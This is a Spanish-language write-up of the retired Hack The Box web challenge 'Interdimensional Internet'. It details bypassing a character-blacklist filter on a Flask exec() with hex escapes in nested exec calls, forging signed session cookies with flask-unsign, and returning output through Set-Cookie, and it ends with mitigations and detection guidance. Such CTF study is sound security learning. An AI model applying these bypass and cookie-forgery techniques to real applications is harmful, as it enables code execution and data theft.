---
challenge: Interdimensional Internet
type: Web
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [web, python, flask, exec, waf-bypass, session-cookie, sandbox-escape]
---

# Interdimensional Internet — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

La versión "adulta" de la calculadora: los campos `ingredient` y `measurements` viajan dentro de la **cookie de sesión firmada** de Flask, el `recipe` debe medir entre 20 y 300 caracteres y un WAF bloquea `[`, `(`, `_` y `.`. Como el filtro se aplica antes de que Python interprete, se evaden los caracteres prohibidos con **escapes hexadecimales** dentro de un `exec` anidado y el resultado se exfiltra escribiéndolo en `flask.session`, que vuelve en `Set-Cookie`.

## Enunciado y superficie

- Web, Medium, retirado. Instancia Docker (`IP:puerto`).
- La descripción mantiene la broma de la calculadora; el código se obtiene de `/debug`, igual que en la versión "baby".

## Reconocimiento

```bash
curl -s http://<IP>:<PUERTO>/
curl -s -i http://<IP>:<PUERTO>/debug | head -40
```

Al enviar el formulario, la petición lleva una cookie `session` de Flask con los dos valores: la aplicación los lee de ahí, no del POST. Eso cambia el punto de ataque: hay que **firmar** la cookie, así que se necesita la `SECRET_KEY`.

## Análisis del código

```python
recipe = "%s = %s" % (session['ingredient'], session['measurements'])
if not (20 <= len(recipe) <= 300):
    return "too short or too long"
if re.search(r"[\[\(\_\.]", recipe):
    return "no"
exec(recipe, garage)
```

- Límite de **20–300** caracteres para el `recipe` completo: el payload debe caber.
- Lista negra de `[`, `(`, `_`, `.`: sin acceso a atributos, sin subíndices, sin llamadas… en apariencia.
- `session` es una cookie firmada, no cifrada: si se filtra `SECRET_KEY` (típico en Flask con `app.secret_key` en el código) se puede forjar.

## Explicación del fallo

El WAF valida la **cadena**, no el código que Python acabará ejecutando. Un `exec` anidado permite pasar una segunda cadena con escapes que el intérprete decodifica **después** del filtro:

```python
exec('exec "\x5b\x28\x5f\x2e"')     # [ ( _ .
```

El filtro ve `exec` y letras; Python ve los caracteres prohibidos. Con eso se reconstruye el acceso a atributos y la cadena de escape por subclases:

```text
''.__class__.__mro__[2].__subclasses__()
```

La longitud obliga a construir el payload por partes y a no desperdiciar bytes: por eso se escribe el resultado directamente en la sesión en lugar de imprimirlo.

## Reproducción local

```bash
python3 - <<'PY'
import re
recipe = 'exec(\'exec "\\x5b\\x28\\x5f\\x2e"\')'
print(len(recipe), bool(re.search(r"[\[\(\_\.]", recipe)))
PY
```

El `re.search` no encuentra nada y `exec` sí decodifica los escapes: la premisa del bypass queda demostrada sin tocar el reto.

## Explotación

1. Obtener `SECRET_KEY` (código filtrado en `/debug`, `.git`, o una clave débil) y firmar la cookie con `flask-unsign`:

```bash
flask-unsign --sign --cookie "{'ingredient':'x','measurements':'<PAYLOAD>'}" --secret '<SECRET_KEY>'
```

2. Enviar la cookie con el payload anidado. La estructura del payload es:

```text
exec('exec "<código con \\x5b \\x28 \\x5f \\x2e>"')
```

3. Exfiltrar por la sesión: el código ejecutado asigna el resultado a `flask.session['x']`, y la respuesta lo devuelve en `Set-Cookie` (firmado, pero legible en base64).

```bash
curl -s -b "session=<COOKIE>" http://<IP>:<PUERTO>/ -D - -o /dev/null | grep -i set-cookie
```

4. Decodificar el valor: la cookie de Flask es `base64(zlib(json))`; sin `itsdangerous` de por medio, el contenido se lee con:

```bash
python3 -c "import base64,zlib;print(zlib.decompress(base64.urlsafe_b64decode('<VALOR>=='.strip('='))))"
```

El índice del objeto `file`/`os` en `__subclasses__()` depende del intérprete: se localiza listando y contando, no se copia a ciegas.

## Evidencia

- Cookie forjada, respuesta con `Set-Cookie` y salida decodificada recortada.
- Sin flags reales: los valores viven en `private/`.

## Lecciones aprendidas

- Los WAF sobre cadenas se saltan con lo que el intérprete decodifica después: escapes `\x`, unicode, concatenación.
- Contar caracteres es parte del exploit: 300 bytes obligan a escribir el payload más corto posible.
- `flask.session` es un canal de salida excelente cuando no hay respuesta directa: el dato vuelve al cliente.
- Una `SECRET_KEY` en el código equivale a control de la sesión; el resto es Python.
- `exec` anidado (`exec('exec "..."')`) es el patrón para pasar una segunda fase sin que el filtro la vea.

## Mitigaciones y detección

- Eliminar `exec`/`eval`; si el cálculo es necesario, parser restringido con AST y allowlist de operadores.
- `SECRET_KEY` aleatoria y fuera del código; rotarla invalida cookies forjadas.
- Detección: cookies `session` con payloads que contengan `\x` o `exec`, tamaño anómalo de la cookie y respuestas 200 con `Set-Cookie` distinto en cada petición.
- Registrar y alertar de errores de sintaxis repetidos en el endpoint: un atacante itera payloads y deja trazas.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1027 (obfuscated files or information), T1005 (data from local system).

## Referencias

- <https://d4rkstat1c.medium.com/interdimensional-internet-hackthebox-writeup-5f8e5b27e3a>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet>
- <https://forum.hackthebox.com/t/web-interdimensional-internet/2122>
- <https://flask.palletsprojects.com/en/stable/api/#sessions>
